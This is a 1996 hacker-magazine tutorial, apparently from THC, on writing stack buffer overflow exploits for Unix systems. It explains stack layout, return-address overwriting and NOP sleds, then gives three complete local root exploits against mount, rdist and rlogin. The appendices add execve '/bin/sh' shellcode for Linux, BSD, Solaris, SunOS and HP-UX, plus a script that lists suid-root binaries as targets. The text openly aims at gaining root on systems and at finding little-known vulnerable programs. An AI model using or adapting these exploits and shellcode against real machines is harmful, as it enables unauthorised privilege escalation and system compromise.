@@ -1,0 +1,713 @@
+-------------------------------------------------------------------------------
+ øSTACK OVERFLOW EXPLOiTS ON LiNUX/BSDOS/FREEBSD/SUNOS/SOLARiS/HP-UXø
+-------------------------------------------------------------------------------
+
+ øintroductionø
+ ~~~~~~~~~~~~
+ welcome to the world of stack overflows, actually i planned an article
+ explaining the complete operation of stack overflows on pc based unix
+ systems, but as i read the new phrack magazine issue #49 i realized that
+ somebody else had already written this article. well, if you want to learn
+ more about the backgrounds (assembler programming/debugging) of stack
+ overflows on linux systems and want to read an excellent article get the
+ latest phrack magazine issue #49, article 14 by aleph one, the most com-
+ plete article i have ever seen, great job! (phrack49.zip)
+ but if you are not interested in understanding hundreds of lines pure
+ i80386 (disassembled) assembler code and want to have a more practical
+ guide, continue reading this article in order to easily learn how to use
+ overflow exploits on various unix systems.
+
+
+ øcontentsø
+ ~~~~~~~~
+                  [øaø]    øthe stack - small backgroundø
+                  [øbø]    østructure of the stackø
+                  [øcø]    øabusing the return adressø
+                  [ødø]    øexecuting a shell in assemblerø
+                  [øeø]    øgetting the real stack adressø
+                  [øfø]    øenvironment/command line variablesø
+                  [øgø]    øclosing wordsø
+
+           exploit[ø1ø]    ømount.c  - linux version: < 2.0.8ø
+           exploit[ø2ø]    ørdist.c  - all bsd version: 2.0ø
+           exploit[ø3ø]    ørlogin.c - solaris version: 2.5 & 2.5.1ø
+
+          appendix[øAø]    øasm and c code for executionø
+          appendix[øBø]    ønop commands for different systemsø
+          appendix[øCø]    øget_sp() for different systemsø
+          appendix[øDø]    øfindsuid.sh - shellscriptø
+
+
+ [øaø] øthe stack - small backgroundø
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ the main function of every CPU is processing and moving of data. while
+ processing or moving the CPU needs a place to fast save important
+ information due the limited space of the registers. these information
+ are saved to the stack. the stack is a special part of the memory that
+ can be accessed with special and very fast commands. the stack is variable
+ in length and position.
+
+ e.g. if a register N is used and a sub-procedure is executed that also
+      uses the register N the CPU will save the value of the register N
+      onto the stack and restore it after the procedure has terminated. in
+      order to improve the speed of this process, the CPU uses the special
+      stack commands that are faster than normal movings in memory.
+ e.g. if a procedure is executed the CPU needs to know where to return to
+      if the procedure is terminated, the return adress is saved on the
+      stack before executing the procedure and after terminatig the proce-
+      dure the CPU jumps to the return adress stored on the stack.
+
+ there is a second function of the stack. if a program creates or receives
+ data, the new data field will be stored in the memory, all programs use
+ dynamic data fields to store such information. the CPU creates such fields
+ on the stack if they are needed and removes them if they are not needed
+ anymore, local variables or arrays are dynamic.
+
+ e.g. if a procedure should exchange two variables (a <-> b), it needs a
+      third variable c to store one value:       c <- a
+                                                 a <- b
+                                                 b <- c
+      the variable c would be installed on the stack and removed after the
+      procedure has terminated.
+
+ for sure you now remember my introducing words promising something like
+ "easily creating exploits without learning all the shit behind". well,
+ i'm sorry but you have to know some of the backgrounds, and i try to
+ explain these as simple as possible. (i could have explained everything
+ in assembler code ;]
+
+
+ [øbø] øthe structure of the stackø
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ the stack is structured in a way that confuses some people sometimes (like
+ me), the first stored value will be read as last and the last stored value
+ will be read as first, this system is called "last in, first out" or LIFO.
+ now let's take a closer look at the stack, imagine we have just executed
+ a procedure in a program (just to keep your interest: we will later do
+ this to gain r00t privileges). how does the stack look like if the
+ procedure needs some own local (dynamic) variables?
+                          .
+                          .
+                          :   ...                 .  .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |  ...
+                          |-----------------------|
+             -1024 bytes  |   local array2[1024]  |  size 1024 bytes
+                          |-----------------------|
+   actual stack position  |   base pointer        |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  |   return adress       |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  :   parameters ...      |  ...
+                          .                       :
+                                                  .  .
+
+ as you see the different mentioned variables and information are stored on
+ the stack. every CPU uses a stack pointer to mark the actual position, it
+ is called SP. the interesting parts of the stack are the local array2 and
+ the return adress, we don't care about the rest because we want to gain
+ r00t access and that is all.
+
+
+ [øcø] øabusing the return adressø
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ as you remember before executing a procedure the CPU saves a return adress
+ onto stack, if the procedure terminates the CPU will jump to the return
+ adress and continue. but if procedure writes more bytes to a local vari-
+ able as its size it will overwrite the return adress and this is called
+ overflow.
+
+ e.g. if (1024+8) 1032 times the character "X" is written to the local
+      array2 in the picture above, the procedure will overwrite its own
+      return adress. and the stack will look like this:
+                          .
+                          .
+                          :   ...                 .  .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |  ...
+                          |-----------------------|
+             -1024 bytes  |   1024 times "X"      |  size 1024 bytes
+                          |-----------------------|
+   actual stack position  |      4 times "X"      |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  |      4 times "X"      |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  :   parameters ...      |  ...
+                          .                       :
+                                                  .  .
+
+ instead of writing the character "X" onto the return adress, we could
+ write a new adress onto the stack, we would now force the program to jump
+ to where we want!
+ it would be very clever if we jump to an adress where we have placed
+ some own assembler code that will do something interesting (what do you
+ guess?), we could create this assembler code in the local variable; in
+ the example local array2:
+                          .
+                          .
+                          :   ...                 .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |
+                          |-----------------------|
+             -1024 bytes  |   our code            | < -
+                          |-----------------------|    |
+   actual stack position  |   4 bytes of crap     |    |
+                          |-----------------------|    |
+                +4 bytes  |   adress of our code  | ___|
+                          |-----------------------|
+                +4 bytes  :   parameters ...      |
+                          .                       :
+                                                  .
+
+ if the program is owned by r00t and has the suid flag so that a normal
+ user can execute it and it will give the user r00t privileges as long
+ as it is executed, our code could do something with r00t privilegs!
+ but what?
+
+ [ødø] øexecuting a shell in assemblerø
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ if our code would execute a normal shell and we have created the over-
+ flow in a program with the suid flag and it is owned by the r00t we would
+ have a complete r00t shell and the system would finally be hacked. what
+ we need right now is a short assembler code that will execute a shell,
+ well it is not necessary to execute a shell you can also execute any other
+ program.
+ you can find the corresponding assembler code for the different systems
+ in the appendix [A] in pure assembler and compiled in a c char field
+ called "execshell".
+ if you still want to know how to disassemble such a code read article 14
+ of the phrack magazine #49 or contact me via email. "/bin/sh" has been
+ added to the code in most cases (exceptions: sparc code), if you want to
+ execute a different program just change the char field.
+ in order to guarantee our code to function we copy it and lots of nops in
+ the data field that will later be copied to the local variable. (nop is
+ a shortform of "no operation"). this data field need to be bigger than the
+ local variable in order to overwrite the return adress. in the following
+ example lv_size is the size of the local variable we want to overflow and
+ buffer is the name of the data field (that is also local).
+
+ e.g. #define lv_size=1024
+      char buffer[lv_size+8]
+
+ we add exactly 8 bytes, take a closer look at the stack above and youl
+ will know why. if we want to overwrite the return adress we have to over-
+ write 4 bytes base pointer and 4 bytes return adress.
+ the data field buffer should look like this:
+
+     ...  <nop> <nop> <nop> <nop> <nop> <code executing a shell>
+
+ look at this c code in order to learn how we can do this, lv_size is a
+ shortform of local variable size, execshell is the char field with our
+ assembler code and the path of the shell we want to execute. ptr is a
+ pointer to the field that we will copy over the local variable.
+
+ e.g. the easy version:   for(i=0;i<lv_size-strlen(execshell);i++)
+                           ptr[i]=0x90;
+                          for(i=0;i<strlen(execshell);i++)
+                           ptr[i+lv_size-strlen(execshell)]=execshell[i];
+
+ e.g. the elegant way:    memset(ptr,0x90,lv_size-strlen(execshell));
+                          ptr+=lv_size-strlen(execshell);
+                          for(i=0;i<strlen(execshell);i++)
+                           *(ptr++)=execshell[i];
+
+ these examples are designed for pc based unix system because they use
+ 0x90 which is the code for a nop command, on other platforms you have to
+ use other codes for nops. i have included several codes for nops, take
+ a look at appendix [B].
+ i will use the easy version in my exploits because i'm not a professional
+ c coder and i prefer indexing like it is used in assembler. now we have
+ filled the buffer with our code and some nops and we are finally near our
+ goal, becoming r00t.
+
+ [øeø] øgetting the real stack adressø
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ do you remember that the stack is variable in position and in length?
+ if not, read [b] to fresh up your brain. we use a small function to get
+ the actual stack adress by saving SP, this adress is the beginning of
+ the stack before installing the local variables and the return adress,
+ i will called it old SP (OSP) in the example.
+ we have to add a variable offset to the OSP, this offset has to be that
+ large that the CPU hits a nop when jumping to the return adress.
+                          .
+                          .                       .
+                          :                       .
+                   OSP -> |-----------------------:        ------
+             -2048 bytes  |   local array1[1024]  |              | offset
+                          |-----------------------|              | larger
+             -1024 bytes  |   <...>               |              | than
+                          |   <nop>               |              | 1024
+                          |   <nop>               |        ______|
+                          |   <nop>               | < -   OSP + offset
+                          |   <nop>               |    |
+                          |   <our code>          |    |
+                          |-----------------------|    |
+   actual stack position  |   4 bytes of crap     |    |
+                          |-----------------------|    |
+                +4 bytes  |   adress: OSP+offset  | ___|
+                          |-----------------------|
+                +4 bytes  :   parameters ...      |
+                          .                       :
+                                                  .
+ in the example we have a local variable in front of the manipulated
+ variable, so we have to generate an offset that is larger than the size
+ of this variable.
+ in order to get the SP value, we use a function called get_sp(), of cause
+ there are different methods to get this value on different unix system,
+ i have included several versions in appendix [C]. ptr2 is a long or dword
+ pointer to ptr which points to the return adress in the buffer.
+
+ e.g. the correct code: ptr2=(long *)ptr;
+                        *ptr2=get_sp()+offset;
+
+ e.g. the robust code:  ptr2=(long *)ptr;
+                        for(i=1;i<8;i++)
+                        *(ptr2++)=get_sp()+offset;
+
+ i will use the robust code in my exploits because it writes the return
+ adress 8 times to the stack, if our estimated stack adress is wrong,
+ we have still 7 other places where it could jump to.
+
+ [øfø] øenvironment/command line variablesø
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ you are for sure now tired of all this basic and theoratical stuff, you
+ are right, it is time to find a target and attack it. the program that
+ should be attacked has to be owned by root and has to be set suid. if
+ you want to find some of these programs just use the the findsuid shell
+ in appendix[D].
+ if you have read the upper text parts carefully you now know how to over-
+ flow the stack by using a local variable, but how can i detect that a
+ program is vunerable to the overflow bug? there are two main ways of
+ passing variables to a program the command line and environment variables.
+
+ e.g. command line variable: cat /test.file
+                                 ^ variable (type: char[256])
+
+ after loading the machine code of the program and executing the first
+ procedures the program will copy the command line into a buffer, if there
+ is no size check you can use the command line to overflow the stack, in
+ order to find out the size of the command line variable try some chars on
+ the command line. (e.g. 1024+4, 256+4, 512+4,...) if the program reports
+ "segmentation fault", you can use the program to get r00t access. of cause
+ their exist programs with really huge command line e.g. 8000 bytes. if you
+ have generated a list of suid/root files on your system, just try if there
+ are vunerable on their command line. the second possibilty is to pass the
+ variable by using an environment variable.
+
+ e.g. environment variable:  set TERM=1234
+
+ the program will copy the evironment variable TERM to a buffer, but the
+ size of this buffer can be different, in order to overflow it you need
+ to check sizes like 256, 512, 1024, 2048 and so on. to find out which
+ programs use environment variables is not that easy, of cause you can
+ guess that some programs need to read system information from the en-
+ viroment variables but the best way to find out is to look inside the
+ c source files.
+ In any case try to find out new vulnerable programs, because it is always
+ better to use exploits that are not common and known to the huge crowd of
+ lame exploit abusers.
+
+ [øgø] øclosing wordsø
+ ~~~~~~~~~~~~~~~~~
+ after reading all this timewasting crap you should be able to generate
+ overflow exploits yourself, as a small demonstration i included three
+ sample exploits (which work). I modified the original sources so they've
+ got the same variable names as in the examples so that it should be easy for
+ you to understand the code.
+
+ exploits:           exploit[1]  mount.c  - linux version: < 2.0.8
+                     exploit[2]  rdist.c  - all bsd version: 2.0
+                     exploit[3]  rlogin.c - solaris version: 2.5 & 2.5.1
+
+ you have an undefined feeling in your stomach; if you want to complain
+ about this article, if you want to flame or diss me, if you want to have
+ more information, if you want to swap things or if you just want to leave
+ a useless mail, feel free to contact me via e-mail...
+ PLASMOID@USA.NET and soon on the THC server PLASMOID@INSECURITY.ORG
+ if you are not linked to the internet contact me at the LORE BBS by van
+ hauser/thc. you can also contact me via IRC i'm normally in the channel
+ #bluebox if my account is not k-lined ;)
+
+                                                       - plasmoid/thc/deep
+                                                       The Hacker's Choice
+                                             Drinking Evil Elite Phreakers
+
+ plasmoid deep/thc <plasmoid@usa.net>
+
+ -----BEGIN PGP PUBLIC KEY BLOCK-----
+ Version: 2.6.3i
+ mQCNAzJZDKwAAAEEANBXUFXqCzZLKuPj7OwB5O7thWOHlzzsi6SEZfsbiysPU4TL
+ AMsBuCV4257Rr0//aEMt4CWjAkO3YWcBzBMvGQIDhT06v9SB4LZep6wJlSIsFK3v
+ L1x+iYzSlvoXOHYSBcjoXA3sDm+kzz49to77Z20bJru7upjHD8iQeMWdAg+hAAUR
+ tBtwbGFzbW9pZCA8cGxhc21vaWRAdXNhLm5ldD6JAJUDBRAyWQysyJB4xZ0CD6EB
+ AQ6GBACB1n9DkgHfnC7D245MZPpacEHI8Jwj0DV6inV19E9qWf4VDdXA8+9YLuUV
+ hsV1/WRX3sJWGWmAQASPitl2tc+7vWw6VC4gjif1XsRttIuNwmvU+DPY7ZULueFe
+ bKoLI2zXsnWm/+8PMjc6GSYsNrXSpUjqkH6nIt6+sytm2QyWBw==
+ =Vbcq
+ -----END PGP PUBLIC KEY BLOCK-----
+
+
+ øexploitø[ø1ø]
+ ~~~~~~~~~~
+ /* -------------------------------------------------------------------------
+    mount.c - mount exploit for linux - version: < 2.0.10
+    discovered by bloodmask&vio/couin
+    coded by plasmoid/thc/deep for thc-magazine issue #3
+    12/12/96 - works also on umount
+    ------------------------------------------------------------------------- */
+
+ #include <stdio.h>
+
+ #define lv_size  1024
+ #define offset     30+lv_size+8*4
+ // -------------------------------------------------------------------------
+ long get_sp()
+ {
+   __asm__("movl %esp, %eax");
+ }
+ // -------------------------------------------------------------------------
+ main(int argc, char **argv)
+ {
+   char execshell[] =
+          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+  char buffer[lv_size+4*8];
+  unsigned long *ptr2 = NULL;
+  char           *ptr = NULL;
+  int           i;
+
+  for(i=0;i<lv_size+4*8;i++)
+   buffer[i]=0x00;
+  ptr=buffer;
+
+  for(i=0;i<lv_size-strlen(execshell);i++)
+   *(ptr++)=0x90;
+  for(i=0;i<strlen(execshell);i++)
+   *(ptr++)=execshell[i];
+  ptr2=(long *)ptr;
+  for(i=1;i<2;i++)
+   *(ptr2++)=get_sp()+offset;
+
+  printf("discovered by bloodmask&vio/couin\ncoded by plasmoid/thc/deep\nfor thc-magazine issue #3\n");
+  (void)alarm((int)0);
+  execl("/bin/mount", "mount", buffer, NULL);
+ }
+
+
+ øexploitø[ø2ø]
+ ~~~~~~~~~~
+ /* -------------------------------------------------------------------------
+    rdist.c - rdist exploit for freebsd & bsd/os - version: 2.0
+    discovered by brian mitchell
+    coded by plasmoid/thc/deep for thc-magazine issue #3
+    12/12/96
+    ------------------------------------------------------------------------- */
+
+ #include <stdio.h>
+
+ #define lv_size   256
+ #define offset     30+lv_size+8*4
+ // -------------------------------------------------------------------------
+ long get_sp()
+ {
+   __asm__("movl %esp, %eax");
+ }
+ // -------------------------------------------------------------------------
+ main(int argc, char **argv)
+ {
+  char execshell[]=
+         "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+         "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+         "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+         "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
+
+  char buffer[lv_size+4*8];
+  unsigned long *ptr2 = NULL;
+  char           *ptr = NULL;
+  int           i;
+
+  for(i=0;i<lv_size+4*8;i++)
+   buffer[i]=0x00;
+  ptr=buffer;
+
+  for(i=0;i<lv_size-strlen(execshell);i++)
+   *(ptr++)=0x90;
+  for(i=0;i<strlen(execshell);i++)
+   *(ptr++)=execshell[i];
+  ptr2=(long *)ptr;
+  for(i=1;i<2;i++)
+   *(ptr2++)=get_sp()+offset;
+
+  printf("discovered by brian mitchell\ncoded by plasmoid/thc/deep\nfor thc-magazine issue #3\n");
+  execl("/usr/bin/rdist", "rdist", "-d", buffer, "-d", buffer, NULL);
+ }
+
+
+ øexploitø[ø3ø]
+ ~~~~~~~~~~
+/*
+ * rlogin-exploit.c: gets a root shell on most Solaris 2.5/2.5.1 machines
+ * by exploiting the gethostbyname() overflow in rlogin.
+ *
+ * gcc -o rlogin-exploit rlogin-exploit.c
+ *
+ * Jeremy Elson, 18 Nov 1996
+ * jeremy.elson@nih.gov
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BUF_LENGTH      8200
+#define EXTRA           100
+#define STACK_OFFSET    4000
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
+"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
+"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
+"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd4\xff\xff";
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode);
+
+  long_p = (u_long *) buf;
+
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+  targ_addr = get_sp() - STACK_OFFSET;
+  for (i = 0; i < EXTRA / sizeof(u_long); i++)
+    *long_p++ = targ_addr;
+
+  printf("Jumping to address 0x%lx\n", targ_addr);
+
+  execl("/usr/bin/rlogin", "rlogin", buf, (char *) 0);
+  perror("execl failed");
+}
+
+
+ øappendixø[øAø]
+ ~~~~~~~~~~~
+-------------------------------------------------------------------------------
+ linux/i80386+
+-------------------------------------------------------------------------------
+ assembler code:
+ ~~~~~~~~~~~~~~
+                jmp    end_of_code
+ execve:        popl   %esi
+                movl   %esi,0x8(%esi)
+                xorl   %eax,%eax
+                movb   %eax,0x7(%esi)
+                movl   %eax,0xc(%esi)
+                movb   $0xb,%al
+                movl   %esi,%ebx
+                leal   0x8(%esi),%ecx
+                leal   0xc(%esi),%edx
+                int    $0x80
+                xorl   %ebx,%ebx
+                movl   %ebx,%eax
+                inc    %eax
+                int    $0x80
+ end_of_code:   call   exec_prog
+                .string "/bin/sh\"
+
+ string for c code:
+ ~~~~~~~~~~~~~~~~~~
+ char execshell[] =
+        "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+        "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+        "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+-------------------------------------------------------------------------------
+ bsd/os/i80386+ and freebsd/i80386+
+-------------------------------------------------------------------------------
+ assembler code:
+ ~~~~~~~~~~~~~~~
+                jmp     end_of_code
+ execve:        popl    %esi
+                leal    (%esi), %ebx
+                movl    %ebx, 0x0b(%esi)
+                xorl    %edx, %edx
+                movl    %edx, 7(%esi)
+                movl    %edx, 0x0f(%esi)
+                movl    %edx, 0x14(%esi)
+                movb    %edx, 0x19(%esi)
+                xorl    %eax, %eax
+                movb    $59, %al
+                leal    0x0b(%esi), %ecx
+                movl    %ecx, %edx
+                pushl   %edx
+                pushl   %ecx
+                pushl   %ebx
+                pushl   %eax
+                jmp     bewm
+ end_of_code:   call    execve
+                .string   '/bin/sh'
+                .byte   1, 1, 1, 1
+                .byte   2, 2, 2, 2
+                .byte   3, 3, 3, 3
+ bewm:          .byte   0x9a, 4, 4, 4, 4, 7, 4
+
+ string for c code:
+ ~~~~~~~~~~~~~~~~~~
+ char execshell[]=
+        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
+
+
+
+------------------------------------------------------------------------------
+ solaris/sparc processor
+------------------------------------------------------------------------------
+ assembler code:
+ ~~~~~~~~~~~~~~~
+                sethi   0xbd89a, %l6
+                or      %l6, 0x16e, %l6
+                sethi   0xbdcda, %l7
+                and     %sp, %sp, %o0
+                add     %sp, 8, %o1
+                xor     %o2, %o2, %o2
+                add     %sp, 16, %sp
+                std     %l6, [%sp - 16]
+                st      %sp, [%sp - 8]
+                st      %g0, [%sp - 4]
+                mov     0x3b, %g1
+                ta      8
+                xor     %o7, %o7, %o0
+                mov     1, %g1
+                ta      8
+
+ string for c code:
+ ~~~~~~~~~~~~~~~~~~
+ char execshell[59]=
+        0x2d,0x0b,0xd8,0x9a,0xac,0x15,0xa1,0x6e,0x2f,0x0b,0xdc,0xda,0x90,
+        0x0b,0x80,0x0e,0x92,0x03,0xa0,0x08,0x94,0x1a,0x80,0x0a,0x9c,0x03,
+        0xa0,0x10,0xec,0x3b,0xbf,0xf0,0xdc,0x23,0xbf,0xf8,0xc0,0x23,0xbf,
+        0xfc,0x82,0x10,0x20,0x3b,0x91,0xd0,0x20,0x08,0x90,0x1b,0xc0,0x0f,
+        0x82,0x10,0x20,0x01,0x91,0xd0,0x20,0x08";
+
+  optional version:
+  char execshell[54]=
+            0x9fc0202c,0xc0247ff5,0xe227bff0,0xc027bff4,0x9207bff0,0x901d200a,
+            0x901a200a,0x8210203b,0x91d02008,0x82102001,0x91d02008,0xa3c3e004,
+            "/bin/sh";
+
+
+------------------------------------------------------------------------------
+ sunos/sparc processor
+------------------------------------------------------------------------------
+ assembler code:
+ ~~~~~~~~~~~~~~~
+                sethi   0xbd89a, %l6
+                or      %l6, 0x16e, %l6
+                sethi   0xbdcda, %l7
+                and     %sp, %sp, %o0
+                add     %sp, 8, %o1
+                xor     %o2, %o2, %o2
+                add     %sp, 16, %sp
+                std     %l6, [%sp - 16]
+                st      %sp, [%sp - 8]
+                st      %g0, [%sp - 4]
+                mov     0x3b, %g1
+                mov     -0x1, %l5
+                ta      %l5 + 1
+                xor     %o7, %o7, %o0
+                mov     1, %g1
+                ta      %l5 + 1
+
+ string for c code:
+ ~~~~~~~~~~~~~~~~~~
+ char execshell[63]=
+        0x2d,0x0b,0xd8,0x9a,0xac,0x15,0xa1,0x6e,0x2f,0x0b,0xdc,0xda,0x90,
+        0x0b,0x80,0x0e,0x92,0x03,0xa0,0x08,0x94,0x1a,0x80,0x0a,0x9c,0x03,
+        0xa0,0x10,0xec,0x3b,0xbf,0xf0,0xdc,0x23,0xbf,0xf8,0xc0,0x23,0xbf,
+        0xfc,0x82,0x10,0x20,0x3b,0xaa,0x10,0x3f,0xff,0x91,0xd5,0x60,0x01,
+        0x90,0x1b,0xc0,0x0f,0x82,0x10,0x20,0x01,0x91,0xd5,0x60,0x01";
+
+------------------------------------------------------------------------------
+ hp-ux9/hp9000
+------------------------------------------------------------------------------
+ string for c code:
+ ~~~~~~~~~~~~~~~~~~
+ char execshell[]=
+        "\x34\x59\x01\x02\x34\x5a\x01\x32\x37\x5a\x3e\xf9\x6b\x3a\x3f\x01"        "\x63\x40\x3f\xff\x34\x5a\x01\x38\x63\x40\x3f\x35\x37\x5a\x3e\xf9"
+        "\x6b\x3a\x3f\x09\x63\x40\x3f\xff\x0b\x5a\x02\x9a\x6b\x3a\x3f\x11"
+        "\x34\x5a\x01\x22\x37\x5a\x3e\xf9\x6f\x3a\x3e\xf9\x20\x20\x08\x01"
+        "\x34\x16\x01\x1e\xe4\x20\xe0\x08\x36\xd6\x3e\xf9\x0b\x5a\x02\x9a"
+        "\x20\x20\x08\x01\x34\x16\x01\x0a\xe4\x20\xe0\x08\x36\xd6\x3e\xf9"
+        "\xe8\x5f\x1f\x35\x0b\x5a\x02\x9a\x01\x01\x01\x01\x01\x01\x01\x01"        "\x01\x01\x01\x01\x01\x01\x01\x01\x00/bin/sh";
+ øappendixø[øBø]
+ ~~~~~~~~~~~
+-------------------------------------------------------------------------------
+ no operation - nop - for the different systems
+-------------------------------------------------------------------------------
+ linux/i80386+                            -  char nop[1]=0x90;
+ bsd/os/i80386+ and freebsd/i80386+       -  char nop[1]=0x90;
+ solaris/sparc processor                  -  char nop[4]=0xac15a16e;
+ sunos/sparc processor                    -  char nop[4]=0xac15a16e;
+ hp-ux9/hp9000                            -  char nop[4]=0xac15a16e;
+
+ øappendixø[øCø]
+ ~~~~~~~~~~~
+-------------------------------------------------------------------------------
+ linux/i80386+ and bsd/os/i80386+ and freebsd/i80386+
+-------------------------------------------------------------------------------
+ getting the stackpointer:
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
+ long get_sp()
+ {
+  __asm__("movl %esp,%eax");
+ }
+
+-------------------------------------------------------------------------------
+ solaris/sparc processor and sunos/sparc processor
+-------------------------------------------------------------------------------
+ getting the stackpointer:
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
+ long get_sp()
+ {
+  asm("or %sp, %sp, %i0");
+ }
+
+ øappendixø[øDø]
+ ~~~~~~~~~~
+--------------------------------------------------------------------[cut here]-
+ #!/bin/sh
+ # findsuid.sh by plasmoid/thc/deep
+ # important directories for linux system, try different ones
+ # for other systems (/usr/etc, /usr/local/bin, /usr/local/etc, /usr/sbin)
+ find /bin -user root -perm +a=s > suid.lst
+ find /sbin -user root -perm +a=s >> suid.lst
+ find /usr/bin -user root -perm +a=s >> suid.lst
+ find /etc -user root -perm +a=s >> suid.lst
+ find /var -user root -perm +a=s >> suid.lst
+--------------------------------------------------------------------[cut here]-
+
+ <END OF FiLE - THC iN 1996>
+
